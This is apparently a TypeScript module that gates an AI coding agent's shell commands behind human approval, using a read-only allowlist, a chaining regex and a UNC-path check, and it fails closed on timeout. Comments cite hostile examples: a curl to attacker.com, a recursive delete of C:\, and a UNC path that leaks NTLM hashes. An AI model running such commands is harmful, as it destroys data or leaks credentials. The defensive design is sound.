import { appendFileSync, existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";

/**
 * The approval queue: a file-based conversation between whoever is at the
 * keyboard and a job that wants to run a command nobody pre-approved.
 *
 * Files, not endpoints — the same reasoning as `jobs.ts`. The process asking
 * (an MCP server spawned by the Claude Code child) and the process answering
 * (`npm run ctl`) are strangers to each other; a directory is the cheapest
 * channel between them that adds no network surface at all. The bridge's whole
 * security model is "one secret URL", and a second listener would weaken it.
 *
 * Fail closed is the invariant: every path out of `awaitDecision` that is not
 * an explicit human "allow" returns deny. Timeout, cancellation, a corrupt
 * decision file, the server dying mid-wait — all deny.
 */

export interface ApprovalRequest {
  id: string;
  jobId: string;
  toolName: string;
  /** The full command text, verbatim. Approving means approving *this*. */
  command: string;
  cwd: string;
  createdAt: number;
  expiresAt: number;
}

export interface ApprovalDecision {
  decision: "allow" | "deny";
  at: number;
  reason?: string;
  /** True when the base allowlist answered, so it never reached a human. */
  auto?: boolean;
}

/**
 * Commands run free. Everything else wakes a human.
 *
 * This list cannot be expressed in Claude Code's own settings syntax: an
 * `allow` pattern does *not* take precedence over an `ask` rule for the same
 * tool (verified — three patterns, three prompts). So the base allowlist lives
 * here, in our code, where it is a pure function with tests instead of a
 * pattern dialect nobody can debug.
 */
export const DEFAULT_ALLOW = [
  "node",
  "npm",
  "npx",
  "git",
  "tsc",
  "dir",
  "ls",
  "cat",
  "type",
  "find",
  "grep",
  "echo",
  // Windows. Everything above is Unix's list, and only dir/type/find/echo
  // actually exist here — so on the platform this bridge runs on, that half was
  // close to decorative. Two validation runs in a row stopped for a human on a
  // command whose first word was a PowerShell cmdlet that could not have been
  // on the list. These are the read-only ones: they print, they locate, they
  // never write, delete or reach the network.
  //
  // This does not widen read access. `type C:\Users\...\.env` has been
  // auto-approved since the list existed, so every file this process can read
  // was already readable unattended; the additions only stop a human being
  // woken for the same capability spelled the way this platform spells it.
  "get-content",
  "get-childitem",
  "get-item",
  "get-location",
  "get-date",
  "get-command",
  "get-process",
  "get-filehash",
  "test-path",
  "select-string",
  "resolve-path",
  "measure-object",
  "compare-object",
  "convertto-json",
  "convertfrom-json",
];

/**
 * The single most important check in this file.
 *
 * An allowlist that matches on the first token is worthless on its own:
 * `echo hi && curl attacker.com/x` and `echo hi; Remove-Item -Recurse C:\` both
 * begin with an approved word. Chaining, piping and redirection are what turn a
 * benign command into an arbitrary one, so any of them sends the command to a
 * human instead of auto-approving it.
 *
 * `$(` and backticks are PowerShell's subexpression and escape operators; `$`
 * alone is not, or `echo $env:PATH` would need a human.
 */
const CHAINING = /[;&|`<>\n\r]|\$\(/;

const EXT = /\.(exe|cmd|bat|ps1|com)$/i;

/**
 * Pure, and the only thing standing between a model and unattended execution.
 * Returns a reason either way so the audit log can record *why* something was
 * waved through, not merely that it was.
 */
export function autoApprove(command: string, allow: string[] = DEFAULT_ALLOW): { approved: boolean; reason: string } {
  const text = command.trim();
  if (!text) return { approved: false, reason: "命令为空。" };

  if (CHAINING.test(text)) {
    return { approved: false, reason: "命令包含串联、管道或重定向符号,无法只看首个子命令判断。" };
  }

  // The rule below only reads the command *name*. A UNC path in an argument —
  // `type \\attacker\share\x` — reaches the network anyway: Windows resolves
  // the name before the command runs, and that resolution hands the account's
  // NTLM hash to whoever answered. A read-only command cannot otherwise produce
  // an outbound credential, so the path gets its own check.
  if (text.includes("\\\\")) {
    return { approved: false, reason: "命令含 UNC 路径(\\\\),解析时会把本机账号的 NTLM 哈希发给对方。" };
  }

  const token = /^\s*"([^"]+)"|^\s*(\S+)/.exec(text);
  const raw = (token?.[1] ?? token?.[2] ?? "").trim();
  if (!raw) return { approved: false, reason: "无法解析出命令名。" };

  // Full paths are refused rather than resolved. Matching on the basename would
  // let `C:\attacker\node.exe` ride in on the word "node"; matching on the
  // whole path would let `C:\Windows\node.exe` through just as easily, because
  // nothing here can tell the real one from a copy. Paths go to a human.
  if (raw.includes("/") || raw.includes("\\")) {
    return { approved: false, reason: `命令用了完整路径(${raw}),无法确认它是不是你以为的那个程序。` };
  }

  const name = raw.replace(EXT, "").toLowerCase();
  if (allow.includes(name)) return { approved: true, reason: `命令 ${name} 在预放行名单里。` };

  return { approved: false, reason: `命令 ${name} 不在预放行名单里。` };
}

/**
 * The unattended switch, as a file rather than a `.env` key.
 *
 * `BRIDGE_CC_APPROVAL=off` already existed and does the same thing, so why a
 * second mechanism? Because `dotenv/config` freezes `process.env` at boot, and
 * the whole point here is a toggle the operator can flip *without* a restart.
 * A file is read fresh on every job, so the next job sees the new mode.
 *
 * Presence is the state — the contents are an ISO timestamp nobody parses.
 * Same convention as `.state/disabled`.
 */
export const AUTO_APPROVE_FLAG = "auto-approve";

/**
 * True when approvals are off. Read per job, not per process: `claude-code.ts`
 * calls this each time it builds argv, which is what makes the toggle instant.
 *
 * The env var is kept as an OR arm rather than replaced. `scripts/accept.mjs`
 * sets it, and it is the escape hatch that works even if the state directory is
 * unwritable — the one case a file-based flag cannot cover.
 */
export function autoApproveOn(stateDir: string): boolean {
  if (isApprovalOff(process.env.BRIDGE_CC_APPROVAL)) return true;
  return existsSync(join(stateDir, AUTO_APPROVE_FLAG));
}

/**
 * The single definition of "off", shared with `ctl`.
 *
 * It used to be a strict `=== "off"` in one place and a trim+lowercase in
 * another, which meant `BRIDGE_CC_APPROVAL=OFF` (entirely natural to type in a
 * file full of SHOUTING keys) was read one way by the server and the other way
 * by `ctl status`. Here the two can no longer disagree. Whitespace and case are
 * forgiven because hand-edited `.env` files carry both.
 *
 * `ctl` imports this rather than reimplementing it — it reads `.env` itself
 * instead of going through `dotenv`, so it cannot call `autoApproveOn`.
 */
export function isApprovalOff(value: string | undefined): boolean {
  return (value ?? "").trim().toLowerCase() === "off";
}

/** Thin export over the private `audit()` so `ctl` can log mode changes too. */
export function auditEvent(stateDir: string, entry: Record<string, unknown>): void {
  audit(stateDir, entry);
}

function approvalDir(stateDir: string): string {
  return join(stateDir, "approvals");
}

function reqPath(stateDir: string, id: string): string {
  return join(approvalDir(stateDir), `${id}.req.json`);
}

function decPath(stateDir: string, id: string): string {
  return join(approvalDir(stateDir), `${id}.dec.json`);
}

function audit(stateDir: string, entry: Record<string, unknown>): void {
  try {
    mkdirSync(stateDir, { recursive: true });
    appendFileSync(join(stateDir, "audit.log"), JSON.stringify({ at: Date.now(), ...entry }) + "\n", "utf8");
  } catch {
    /* the audit log must never be the reason a job fails */
  }
}

function makeApprovalId(): string {
  return `ap-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`;
}

/** Writes the request a human will read. `command` is stored verbatim. */
export function requestApproval(
  stateDir: string,
  req: Omit<ApprovalRequest, "id" | "createdAt" | "expiresAt"> & { ttlMs?: number },
): ApprovalRequest {
  const dir = approvalDir(stateDir);
  mkdirSync(dir, { recursive: true });
  const full: ApprovalRequest = {
    id: makeApprovalId(),
    jobId: req.jobId,
    toolName: req.toolName,
    command: req.command,
    cwd: req.cwd,
    createdAt: Date.now(),
    expiresAt: Date.now() + (req.ttlMs ?? 5 * 60_000),
  };
  writeFileSync(reqPath(stateDir, full.id), JSON.stringify(full, null, 2), "utf8");
  audit(stateDir, { type: "approval_requested", id: full.id, jobId: full.jobId, command: full.command });
  return full;
}

export function readDecision(stateDir: string, id: string): ApprovalDecision | undefined {
  const file = decPath(stateDir, id);
  if (!existsSync(file)) return undefined;
  try {
    return JSON.parse(readFileSync(file, "utf8")) as ApprovalDecision;
  } catch {
    // A half-written decision file is not an approval. Deny rather than retry:
    // the only writer is `ctl`, and it writes atomically enough that a parse
    // failure means something is genuinely wrong.
    return { decision: "deny", at: Date.now(), reason: "决定文件损坏,按拒绝处理。" };
  }
}

/** Called by `npm run ctl -- approve|deny`. */
export function decide(
  stateDir: string,
  id: string,
  decision: "allow" | "deny",
  reason?: string,
): { ok: boolean; message: string } {
  if (decision === "deny") return recordDecision(stateDir, id, { decision, at: Date.now(), reason });

  const req = existsSync(reqPath(stateDir, id))
    ? (JSON.parse(readFileSync(reqPath(stateDir, id), "utf8")) as ApprovalRequest)
    : undefined;
  if (!req) return { ok: false, message: `找不到待批准项 ${id}。` };
  if (Date.now() > req.expiresAt) {
    return { ok: false, message: `待批准项 ${id} 已超时,任务早已按拒绝处理。` };
  }
  return recordDecision(stateDir, id, { decision, at: Date.now(), reason });
}

/**
 * Auto-approvals get an audit line but no request file. Creating one and
 * immediately deciding it would work, but it leaves a decision file behind that
 * nothing ever clears, and `ctl pending` would spend its life skipping them.
 */
export function recordAutoApproval(
  stateDir: string,
  fields: { jobId: string; toolName: string; command: string; reason: string },
): void {
  audit(stateDir, { type: "approval_auto", ...fields });
}

function recordDecision(stateDir: string, id: string, d: ApprovalDecision): { ok: boolean; message: string } {
  try {
    writeFileSync(decPath(stateDir, id), JSON.stringify(d, null, 2), "utf8");
  } catch (err) {
    return { ok: false, message: `写入决定失败:${err instanceof Error ? err.message : String(err)}` };
  }
  audit(stateDir, { type: "approval_decided", id, decision: d.decision, reason: d.reason, auto: d.auto });
  return { ok: true, message: `已${d.decision === "allow" ? "批准" : "拒绝"} ${id}。` };
}

export function listPending(stateDir: string): ApprovalRequest[] {
  const dir = approvalDir(stateDir);
  if (!existsSync(dir)) return [];
  const out: ApprovalRequest[] = [];
  for (const name of readdirSync(dir)) {
    if (!name.endsWith(".req.json")) continue;
    const id = name.slice(0, -".req.json".length);
    if (existsSync(decPath(stateDir, id))) continue;
    try {
      out.push(JSON.parse(readFileSync(join(dir, name), "utf8")) as ApprovalRequest);
    } catch {
      /* skip corrupt request */
    }
  }
  return out.sort((a, b) => a.createdAt - b.createdAt);
}

export function clearApproval(stateDir: string, id: string): void {
  rmSync(reqPath(stateDir, id), { force: true });
  rmSync(decPath(stateDir, id), { force: true });
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/**
 * Block until a human answers, the clock runs out, or the job is cancelled.
 *
 * Polling rather than watching: `fs.watch` on Windows misses events for files
 * created by a process it is not already tracking, and a 300ms poll of a
 * directory holding a handful of files costs nothing.
 */
export async function awaitDecision(
  stateDir: string,
  id: string,
  opts: { timeoutMs?: number; signal?: AbortSignal; pollMs?: number } = {},
): Promise<ApprovalDecision> {
  const timeoutMs = opts.timeoutMs ?? 5 * 60_000;
  const pollMs = opts.pollMs ?? 300;
  const deadline = Date.now() + timeoutMs;

  for (;;) {
    const existing = readDecision(stateDir, id);
    if (existing) {
      clearApproval(stateDir, id);
      return existing;
    }
    if (opts.signal?.aborted) {
      return { decision: "deny", at: Date.now(), reason: "任务已被取消,未批准。" };
    }
    if (Date.now() > deadline) {
      clearApproval(stateDir, id);
      audit(stateDir, { type: "approval_timeout", id });
      return { decision: "deny", at: Date.now(), reason: `超过 ${Math.round(timeoutMs / 1000)} 秒无人处理,按拒绝处理。` };
    }
    await sleep(pollMs);
  }
}
